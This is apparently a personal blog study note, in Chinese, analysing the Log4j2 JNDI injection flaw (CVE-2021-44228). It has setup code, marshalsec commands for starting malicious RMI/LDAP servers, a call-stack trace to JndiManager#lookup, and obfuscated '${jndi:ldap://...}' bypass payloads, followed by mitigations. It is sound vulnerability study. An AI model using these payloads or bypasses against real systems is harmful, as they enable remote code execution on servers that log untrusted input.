# Log4j2漏洞学习


&lt;!--more--&gt;

# Log4j2（CVE-2021-44228）

## 前言

没学 java 就知道这个漏洞，应该还有不少的解析和绕过，这里就简单先了解下最基础的

## 简介

log4j2是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具。在log4j框架的基础上进行了改进，并引入了丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。

其被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。在java中最常用的日志框架是log4j2和logback，其中log4j2支持lookup功能（看到这个就知道要打 jndi ）。例如当开发者想在日志中打印今天的日期，则只需要输出`${data:MM-dd-yyyy}`，此时log4j会将${}中包裹的内容单独处理，将它识别为日期查找，然后将该表达式替换为今天的日期内容输出为“08-22-2022”，这样做就不需要开发者自己去编写查找日期的代码。究其根本，还是最后调用触发了 jndi

## 影响版本

2.0 &lt;= Apache log4j2 &lt;= 2.14.1

## 环境搭建

pom.xml

```
      &lt;dependency&gt;
        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
        &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
        &lt;version&gt;2.14.1&lt;/version&gt;
      &lt;/dependency&gt;
      &lt;dependency&gt;
        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
        &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
        &lt;version&gt;2.14.1&lt;/version&gt;
      &lt;/dependency&gt;
      &lt;dependency&gt;
        &lt;groupId&gt;junit&lt;/groupId&gt;
        &lt;artifactId&gt;junit&lt;/artifactId&gt;
        &lt;version&gt;4.12&lt;/version&gt;
        &lt;scope&gt;test&lt;/scope&gt;
      &lt;/dependency&gt;
```

再写个xml文件来实现log4j2（yaml等文件也行），默认文件名为log4j2.xml，放在 `src/main/resources` 目录下

```
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;  
&lt;!-- log4j2 配置文件 --&gt;  
&lt;!-- 日志级别 trace&lt;debug&lt;info&lt;warn&lt;error&lt;fatal --&gt;&lt;configuration status=&#34;info&#34;&gt;  
    &lt;!-- 自定义属性 --&gt;  
    &lt;Properties&gt;  
        &lt;!-- 日志格式(控制台) --&gt;  
        &lt;Property name=&#34;pattern1&#34;&gt;[%-5p] %d %c - %m%n&lt;/Property&gt;  
        &lt;!-- 日志格式(文件) --&gt;  
        &lt;Property name=&#34;pattern2&#34;&gt;  
            =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n  
        &lt;/Property&gt;  
        &lt;!-- 日志文件路径 --&gt;  
        &lt;Property name=&#34;filePath&#34;&gt;logs/myLog.log&lt;/Property&gt;  
    &lt;/Properties&gt;    &lt;appenders&gt; &lt;Console name=&#34;Console&#34; target=&#34;SYSTEM_OUT&#34;&gt;  
        &lt;PatternLayout pattern=&#34;${pattern1}&#34;/&gt;  
    &lt;/Console&gt; &lt;RollingFile name=&#34;RollingFile&#34; fileName=&#34;${filePath}&#34;  
                            filePattern=&#34;logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz&#34;&gt;  
        &lt;PatternLayout pattern=&#34;${pattern2}&#34;/&gt;  
        &lt;SizeBasedTriggeringPolicy size=&#34;5 MB&#34;/&gt;  
    &lt;/RollingFile&gt; &lt;/appenders&gt; &lt;loggers&gt; &lt;root level=&#34;info&#34;&gt;  
    &lt;appender-ref ref=&#34;Console&#34;/&gt;  
    &lt;appender-ref ref=&#34;RollingFile&#34;/&gt;  
&lt;/root&gt; &lt;/loggers&gt;&lt;/configuration&gt;
```

最后写个demo来触发

```
package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.function.LongFunction;

public class test {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(LongFunction.class);

        String username = &#34;admin123&#34;;
        if (username != null ) {
            logger.info(&#34;User {} login in!&#34;, username);
        }
        else {
            logger.error(&#34;User {} not exists&#34;, username);
        }
    }
}
```

可以看到是将登录信息记录到了 myLog.log 中

![image-20250413160907762](https://bu.dusays.com/2025/04/13/67fb712398209.png)

上面说过了 log4j2 会把 `${}` 包裹的进行特殊处理，最后会触发 lookup，以下是一些常见的 lookup 类型

1. ${date}：获取当前日期和时间，支持自定义格式。
2. ${pid}：获取当前进程的 ID。
3. ${logLevel}：获取当前日志记录的级别。
4. ${sys:propertyName}：获取系统属性的值，例如 ${sys:user.home} 获取用户主目录。
5. ${env:variableName}：获取环境变量的值，例如 ${env:JAVA_HOME} 获取 Java 安装路径。
6. ${ctx:key}：获取日志线程上下文（ThreadContext）中指定键的值。
7. ${class:fullyQualifiedName:methodName}：获取指定类的静态方法的返回值。
8. ${mdc:key}：获取 MDC (Mapped Diagnostic Context) 中指定键的值。

比如 `${date}`

![image-20250413161921428](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174424348.png)

## 漏洞分析

先打下，用marshalsec起个恶意的rmi服务

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &#34;http://127.0.0.1:9999/#exp&#34; 9991
```

![image-20250413163110389](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174424362.png)

ldap 也是这样

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &#34;http://127.0.0.1:9999/#exp&#34; 1099
```

![image-20250413163707776](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174424366.png)

打个断点调试，来到 `org.apache.logging.log4j.core.layout.PatternLayout` 下的 `toSerializable` 方法

这个类中有两个 `toSerializable` 方法，由于我们在 log4j2.xml 中是使用 `&lt;PatternLayout pattern=&#34;${pattern1}&#34;/&gt;` 这种静态的配置方式，所以最后会调用到第二个 `toSerializable` 方法中的 `this.formatters.length` 来获取 ，这个类的源码

```
        public StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) {
            int len = this.formatters.length;

            for(int i = 0; i &lt; len; &#43;&#43;i) {
                this.formatters[i].format(event, buffer);
            }

            if (this.replace != null) {
                String str = buffer.toString();
                str = this.replace.format(str);
                buffer.setLength(0);
                buffer.append(str);
            }

            return buffer;
        }
```

这个类就是将日志内容按 log4j2.xml 文件中规定好的格式那样输出，我们这里的格式为 `[%-5p] %d %c - %m%n` 所以第七次循环就会处理 `%m` 也就是我们的日志消息，会调用到 `org.apache.logging.log4j.core.pattern.MessagePatternConverter#format` 

![image-20250413172119526](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174424358.png)

这里的 `this.config` 就是我们实现log4j2的文件类型，这里是xml，`this.noLookups` 为 false 则代表启用 `${}` 变量替换，这里我们没有在xml中显式规定禁用，所以默认是启用的，而且我们这里本来就需要用到变量替换

然后进入到 if 语句里面，如果检测到 `${` 开头，则取出从 `offset` 到当前 `workingBuilder` 末尾的内容，故这里 value 的值就为当时输入的值

![image-20250413173023770](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174424355.png)

然后调用 `replace()` ，又调用 `substitute()`，最后会调用到 `org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariable`，这里的调用栈

```
resolveVariable:1106, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)
replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)
```

其源码

```
    protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf, final int startPos, final int endPos) {
        StrLookup resolver = this.getVariableResolver();
        return resolver == null ? null : resolver.lookup(event, variableName);
    }
```

`resolver`解析时支持的关键词有`[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]`，而我们这里利用的`jndi:xxx`后续就会用到`JndiLookup`这个解析器，调用栈

```
lookup:55, JndiLookup (org.apache.logging.log4j.core.lookup)
lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)
resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)
```

最后调用到log4j2原生的 `lookup()` 方法

![image-20250413180231646](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174424379.png)

## 绕过其防御

先是绕过

递归解析绕过：log4j2 支持表达式递归解析，下面的表达式会逐层解析，由于 `:-`是键值对的分隔符，而表达式只管取值，从而使得  `{::-j}` -&gt; `j`，类似的可以混淆其他字符。

```
loggr.info(&#34;${${::-j}ndi:ldap://127.0.0.1:1099/exp}&#34;);
logger.info(&#34;${${,:-j}ndi:ldap://127.0.0.1:1099/exp}&#34;)
```

lowwer / upper 绕过：使用 log4j2 支持的关键字，实现大小写绕过

```
logg.info(&#34;${${lower:J}ndi:ldap://127.0.0.1:1099/exp}&#34;);
```

防御

先是最简单的，更新到最新版本或者安全版本，比如 2.15.0-rc2 安全版本，并确认不开启 JNDI Lookup ，还有些临时应急操作，比如 jvm 添加 -Dlog4j2.formatMsgNoLookups=true 参数（使得noLookup为true，不会进入到lookup中）

## 总结

调用栈

```
lookup:172, JndiManager (org.apache.logging.log4j.core.net)
lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)
lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)
resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)
replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)
format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)
toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)
toText:244, PatternLayout (org.apache.logging.log4j.core.layout)
encode:229, PatternLayout (org.apache.logging.log4j.core.layout)
encode:59, PatternLayout (org.apache.logging.log4j.core.layout)
directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)
callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)
callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)
callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)
callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)
processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)
log:481, LoggerConfig (org.apache.logging.log4j.core.config)
log:456, LoggerConfig (org.apache.logging.log4j.core.config)
log:82, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config)
log:161, Logger (org.apache.logging.log4j.core)
tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)
logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)
logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)
logMessage:2034, AbstractLogger (org.apache.logging.log4j.spi)
logIfEnabled:1899, AbstractLogger (org.apache.logging.log4j.spi)
info:1444, AbstractLogger (org.apache.logging.log4j.spi)
main:16, test (com.example)
```

sink 点是 lo4j2 包下的 `JndiManager#lookup`

简单分析下后觉得确实无敌，这么刁钻的角度都能找到，这个漏洞的原理和利用都不难，但从source 分析调用到最后的sink点，真的很强，不愧是阿里，听说是codeql找到的，也不知道是不是真的，但用codeql应该轻松不少

还有更多的绕过和修复，以及更深的利用分析，可以见su18师傅的文章：https://tttang.com/archive/1378/#toc_rc1

## 参考

https://gaorenyusi.github.io/posts/log4j2/

https://jaspersec.top/posts/1237655284.html

https://tttang.com/archive/1378/


---

> 作者: 6s6  
> URL: http://localhost:1313/posts/cde7a8a/  

